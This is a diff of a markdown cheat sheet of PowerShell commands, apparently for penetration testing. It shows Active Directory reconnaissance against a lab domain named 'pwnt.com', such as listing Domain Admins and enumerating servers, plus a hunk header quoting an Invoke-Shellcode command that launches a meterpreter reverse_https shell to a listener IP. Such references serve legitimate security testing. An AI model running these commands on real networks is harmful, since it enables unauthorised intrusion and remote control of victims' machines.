@@ -65,54 +65,27 @@ Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> ((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1319606305-3131390644-2280705280-<br>1000")).translate([System.Security.Principal.NTAccount])).value<br>WIN-244VDGE5OGH\johndoe</code></div> 
    
-## Using the PowerShell Active Directory Modules
-### Via https://www.trustedsec.com/uncategorized/powershell-reconnaissance/
-### Setting Credentials 
+ ## Using the PowerShell Active Directory Modules
+ ### Via https://www.trustedsec.com/uncategorized/powershell-reconnaissance/
+ ### Setting Credentials 
  * **Command with arguments**: `$cred = Get-Credential`
  * **Description**: Stores valid credentials in the $cred variable for use with the Active Directory Modules.
  * **Notes**: These following commands require the Powershell Active Directory Modules to be installed. Steps to install for Win7 are detailed [here] (http://blogs.msdn.com/b/rkramesh/archive/2012/01/17/how-to-add-active-directory-module-in-powershell-in-windows-7.aspx) 
    
-### Query to List "Domain Admins" 
+ ### Query to List "Domain Admins" 
  * **Command with arguments**: `Get-ADGroupMember -Credential $cred -server pwnt.com "Domain Admins"`
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>distinguishedName : CN=Administrator,CN=Users,DC=pwnt,DC=com<br>name              : Administrator<br>objectClass       : user<br>objectGUID        : 1fd60ff8-07a4-4c6e-9a1e-7cd0d7bb97db<br>SamAccountName    : Administrator<br>SID               : S-1-5-21-2027135834-1792351174-2509185371-500</code></div> 
    
-### Enumerate All Servers on Domain 
+ ### Enumerate All Servers on Domain 
  * **Command with arguments**: `Get-ADComputer -Credential $cred -server pwnt.com -LDAPFilter "(&(objectCategory=computer)(opera
 tingSystem=*Server*))" |select name`
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>name<br>----<br>PWNT-DC<br>
-Exchange1<br>SharePoint1</code></div> 
+Exchange1<br>
+SharePoint1</code></div>
 
-
-# Powershell CLI short hand:
-## PowerShell.exe
-
-Parameter Shortcut(s)
- * Command `c`
- * EncodedArguments `ea`, `encodeda`
- * EncodedCommand `e`,`ec`
- * ExecutionPolicy `ex`,`ep`
- * File `f`
- * Help `-h`,`-?` or `/h`,`/?`
- * InputFormat `i`,`if`
- * NoExit `noe`
- * NoLogo `nol`
- * NoProfile `nop`
- * NonInteractive `noni`
- * OutputFormat `o`,`of`
- * Sta `s`
- * WindowStyle `w`
-
-## powershell_ise.exe
-Parameter - Shortcut(s)
- * File - `f`
- * Help - `-h`,`-?` or `/h`,`/?`
- * Mta - `m`
- * NoProfile - `n`
-
-
-## Get Info About All Connected Drives
+ ### Get Info About All Connected Drives
  * **Command with arguments**: `[System.IO.DriveInfo]::GetDrives()`
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
@@ -146,93 +119,3 @@ Parameter - Shortcut(s)
 	RootDirectory : E:\
 	VolumeLabel :
     </code></div>
-
-## Obtain detailed information about a running process or service
- * **Command with arguments**: `gps | ?{$_.name -match "<process/service name>"} | ?{$_.id -match "<process/service id>"} | select *`
- * **Output**:
-   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
-	__NounName                 : Process
-	Name                       : firefox
-	Handles                    : 383
-	VM                         : 272830464
-	WS                         : 90185728
-	PM                         : 69402624
-	NPM                        : 24676
-	Path                       : C:\Program Files\Mozilla Firefox\firefox.exe
-	Company                    : Mozilla Corporation
-	CPU                        : 2.1684139
-	FileVersion                : 26.0
-	ProductVersion             : 26.0
-	Description                : Firefox
-	Product                    : Firefox
-	Id                         : 3176
-	PriorityClass              : Normal
-	HandleCount                : 383
-	WorkingSet                 : 90185728
-	PagedMemorySize            : 69402624
-	PrivateMemorySize          : 69402624
-	VirtualMemorySize          : 272830464
-	TotalProcessorTime         : 00:00:02.1684139
-	BasePriority               : 8
-	ExitCode                   :
-	HasExited                  : False
-	ExitTime                   :
-	Handle                     : 1904
-	MachineName                : .
-	MainWindowHandle           : 131426
-	MainWindowTitle            : Mozilla Firefox Start Page - Mozilla Firefox
-	MainModule                 : System.Diagnostics.ProcessModule (firefox.exe)
-	MaxWorkingSet              : 1413120
-	MinWorkingSet              : 204800
-	Modules                    : {System.Diagnostics.ProcessModule (firefox.exe), System.Diagnostics.ProcessModule (ntdll.d
-		                     ll), System.Diagnostics.ProcessModule (kernel32.dll), System.Diagnostics.ProcessModule (KE
-		                     RNELBASE.dll)...}
-	NonpagedSystemMemorySize   : 24676
-	NonpagedSystemMemorySize64 : 24676
-	PagedMemorySize64          : 69402624
-	PagedSystemMemorySize      : 277804
-	PagedSystemMemorySize64    : 277804
-	PeakPagedMemorySize        : 77041664
-	PeakPagedMemorySize64      : 77041664
-	PeakWorkingSet             : 97169408
-	PeakWorkingSet64           : 97169408
-	PeakVirtualMemorySize      : 281219072
-	PeakVirtualMemorySize64    : 281219072
-	PriorityBoostEnabled       : True
-	PrivateMemorySize64        : 69402624
-	PrivilegedProcessorTime    : 00:00:00.4992032
-	ProcessName                : firefox
-	ProcessorAffinity          : 1
-	Responding                 : True
-	SessionId                  : 1
-	StartInfo                  : System.Diagnostics.ProcessStartInfo
-	StartTime                  : 1/29/2014 8:02:12 PM
-	SynchronizingObject        :
-	Threads                    : {2664, 772, 3160, 544...}
-	UserProcessorTime          : 00:00:01.6692107
-	VirtualMemorySize64        : 272830464
-	EnableRaisingEvents        : False
-	StandardInput              :
-	StandardOutput             :
-	StandardError              :
-	WorkingSet64               : 90185728
-	Site                       :
-	Container                  :
-</code></div>
-
-### Translate SID to username
- * **Command with arguments**: `((New-Object System.Security.Principal.SecurityIdentifier("<ssid>")).translate([System.Security.Principal.NTAccount])).value`
- * **Output**:
-   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
-        NT AUTHORITY\SELF
-   </code></div>
-
-### Grab each user on the local system and list their last login time, their SSID and their user path.
- * **Command with arguments**: `gwmi win32_userprofile | select -unique @{name="Name";expression={$_.__server}},@{name="SID";expression={$_.sid}},@{name="LastUseTime";expression={$_.converttodatetime($_.lastusetime)}},localpath | ft -auto`
- * **Output**:
- * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
-WIN-C77DTCDJS11 S-1-5-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx x/xx/2014 x:xx:xx PM C:\Users\xxxx
-WIN-C77DTCDJS11 S-1-5-20                                                            C:\Windows\ServiceProfiles\Netwo...
-WIN-C77DTCDJS11 S-1-5-19                                                            C:\Windows\ServiceProfiles\Local...
-WIN-C77DTCDJS11 S-1-5-18                                                            C:\Windows\system32\config\syste...
-</code></div>
